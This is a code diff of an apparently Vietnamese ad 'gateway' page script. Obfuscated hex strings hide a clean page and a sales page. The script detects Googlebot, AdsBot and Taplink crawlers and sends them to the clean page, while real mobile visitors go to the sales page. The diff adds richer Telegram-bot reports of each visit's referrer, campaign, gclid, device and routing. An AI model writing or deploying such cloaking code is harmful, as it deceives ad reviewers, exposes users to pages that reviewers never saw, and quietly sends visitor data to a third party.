@@ -64,11 +64,11 @@
   <script>
     (function() {
       const K = "920";
-      const D = "74747b05187379f39891d3a1caba85b4b30a0e006b6a18130136628fe58ba1cc94cede98a400422f7b6b1d5e34367a8f99f5afe79e80e9f0fa071622396918543575258f8cadb785808588ae5253527b6c1c13496300d4c6c0fde2938083aaed0e165a616629193d2831d6c1bdafcf9e94bebfa05";
-      const S = "74747b05187379f39891d3a1caba85beae465e4f7c6a12491f366885e09df5e89c8882a8ad004f2f7f671952333867819af9bde7978fed";
+      const D = "74747b05187379f3928cfbe18cc4d3ffb5575f5d7c615e45571e269890eaf6be94dd89bda30c46782c3d4b0361352cde9fa2a8b1c8d0eba7ae0647236b3d5e53613732d3f6fce09d8489beaa5d1b115e6214120b3c21d2cddcbfbcc09493b4974f4f5a6768134f61192cc6c8f1f2b3";
+      const S = "74747b05187379f3928cfbeb918883b0b35f5f40717b19154a2e2992";
       const T = "25303f435e677f828991b0b7b9bdaa94a870696156622b34330b35d3cac6d3bb9ebd8e89a67a5950773a3121370628df";
       const C = "2d363c4c536f7a858d93";
-      const U = "74747b05187379f3928ce1e5889082bfac1c575a36";
+      const U = "74747b05187379f3928cf9ed9b9485b9a65c5e1c2d675f1405282bd4cdc5bce89c84c2";
       const E_AW = "";
       const E_CL = "";
 
@@ -141,11 +141,23 @@
           const gclid = params.get("gclid") ? "Co (gclid)" : "Khong";
           const ua = navigator.userAgent || "";
           
-          const taplinkSource = document.referrer || params.get("taplink") || params.get("src") || params.get("ref") || dec(U) || "Truy cập trực tiếp (Direct)";
+          // 1. Bắt chính xác link Taplink đang chạy trên Google Ads
+          let taplinkSource = "";
+          const ref = document.referrer || "";
+          if (ref && (ref.indexOf("taplink") !== -1 || ref.indexOf("bio") !== -1 || ref.indexOf("http") !== -1)) {
+            taplinkSource = ref;
+          } else {
+            taplinkSource = params.get("taplink") || params.get("src") || params.get("ref") || dec(U) || "https://lichnhanh24h.taplink.bio/";
+          }
 
+          // 2. Báo cáo cụ thể Trang Sạch & Trang Bán Hàng
+          const safeUrlStr = dec(S) || "Chưa cấu hình";
+          const targetUrlStr = dec(D) || "Chưa cấu hình";
+
+          // 3. Phân loại đối tượng và tiêu đề
           let botName = "Googlebot / Crawler";
           if (isTaplink) {
-            botName = "Taplink-Bot / Crawler";
+            botName = "Taplink-Bot (Link Preview Crawler)";
           } else if (/adsbot/i.test(ua)) {
             botName = "AdsBot-Google";
           } else if (/googlebot/i.test(ua)) {
@@ -155,29 +167,49 @@
           }
 
           let title = "🟢 [KHÁCH THẬT CLICK] - MÃ #" + K;
+          let catHashtag = "#KhachThat";
           if (isTaplink) {
             title = "🛡️ [TAPLINK BOT QUÉT LINK] - MÃ #" + K;
+            catHashtag = "#TaplinkBot";
           } else if (isB) {
             title = "🚨 [GOOGLEBOT DUYỆT ADS] - MÃ #" + K;
+            catHashtag = "#Googlebot";
           } else if (taplinkStatus && (taplinkStatus.indexOf("KHÓA") !== -1 || taplinkStatus.indexOf("LỖI") !== -1)) {
             title = "⚠️ [CẢNH BÁO TAPLINK BỊ KHÓA] - MÃ #" + K;
+            catHashtag = "#TaplinkBiKhoa";
           }
 
-          const targetObj = isB ? (isTaplink ? "Taplink-Bot (Link Preview)" : (botName + " (" + reason + ")")) : "Người thật (Mobile Touch)";
-          const routeAction = isB ? "Đá an toàn sang link sạch" : "Nhảy vào Web bán hàng";
+          const targetObj = isB ? (isTaplink ? botName : (botName + " (" + reason + ")")) : "Người thật (Mobile Touch)";
+          const routeAction = isB ? ("⛔ Đá an toàn sang Trang Sạch (" + safeUrlStr + ")") : ("⚡ Nhảy vào Trang Bán Hàng (" + targetUrlStr + ")");
+
+          // 4. Thống kê số lần bot quét / lượt click
+          let scanCount = 1;
+          try {
+            const countKey = (isB ? "tplk_bot_scan_" : "tplk_user_click_") + K;
+            scanCount = (parseInt(localStorage.getItem(countKey) || "0")) + 1;
+            localStorage.setItem(countKey, scanCount);
+          } catch(eCount) {}
+
+          const scanLabel = isB ? ("📊 Số lần bot quét ghi nhận: Lần thứ #" + scanCount) : ("📊 Lượt tương tác ghi nhận: Lần thứ #" + scanCount);
+          const hashtags = "#BotScan_" + K + " #Taplink_" + K + " " + catHashtag;
 
           const msg = title + "\n" +
             "━━━━━━━━━━━━━━━━━━━━\n" +
             "🔑 Mã Gateway: #" + K + "\n" +
-            "🌐 Nguồn từ Taplink: " + taplinkSource + "\n" +
+            "🌐 Link Taplink đang chạy: " + taplinkSource + "\n" +
             "💻 Cổng GitHub: " + path + "\n" +
             "🎯 Chiến dịch: " + campaign + "\n" +
             "🔍 Gclid: " + gclid + "\n" +
             (isB ? "🤖 Đối tượng: " : "👤 Đối tượng: ") + targetObj + "\n" +
             "📱 Thiết bị: " + navigator.platform + " | Touch: " + (navigator.maxTouchPoints || 0) + "\n" +
-            "🛡️ Điều hướng: " + routeAction + "\n" +
+            "🛡️ Trang Sạch (Safe): " + safeUrlStr + "\n" +
+            "💰 Trang Bán Hàng (Target): " + targetUrlStr + "\n" +
+            "🚀 Điều hướng thực tế: " + routeAction + "\n" +
             "📡 Trạng thái Taplink: " + taplinkStatus + "\n" +
-            (isB ? "⏱️ Thời gian: " : "⏰ Thời gian: ") + new Date().toLocaleTimeString("vi-VN");
+            scanLabel + "\n" +
+            (isB ? "⏱️ Thời gian: " : "⏰ Thời gian: ") + new Date().toLocaleTimeString("vi-VN") + "\n" +
+            "━━━━━━━━━━━━━━━━━━━━\n" +
+            hashtags;
 
           const qs = "chat_id=" + encodeURIComponent(chatId) + "&text=" + encodeURIComponent(msg);
           const tgUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
@@ -202,7 +234,7 @@
 
       let taplinkStatus = "🟢 Đang hoạt động (Active)";
       const ref = (document.referrer || "").toLowerCase();
-      if (ref && (ref.indexOf("taplink.at") !== -1 || ref.indexOf("taplink.cc") !== -1)) {
+      if (ref && (ref.indexOf("taplink") !== -1 || ref.indexOf("bio") !== -1)) {
         taplinkStatus = "🟢 Đang hoạt động (Traffic từ Taplink)";
       } else if (!ref) {
         taplinkStatus = "⚠️ Truy cập trực tiếp (Không có Referrer Taplink)";
@@ -212,7 +244,7 @@
       const isB = botResult.isBot;
       const isTaplink = botResult.isTaplink;
 
-      const taplinkUrlCheck = dec(U);
+      const taplinkUrlCheck = dec(U) || (document.referrer ? document.referrer : "https://lichnhanh24h.taplink.bio/");
       if (taplinkUrlCheck && taplinkUrlCheck.startsWith("http")) {
         try {
           var probeImg = new Image();
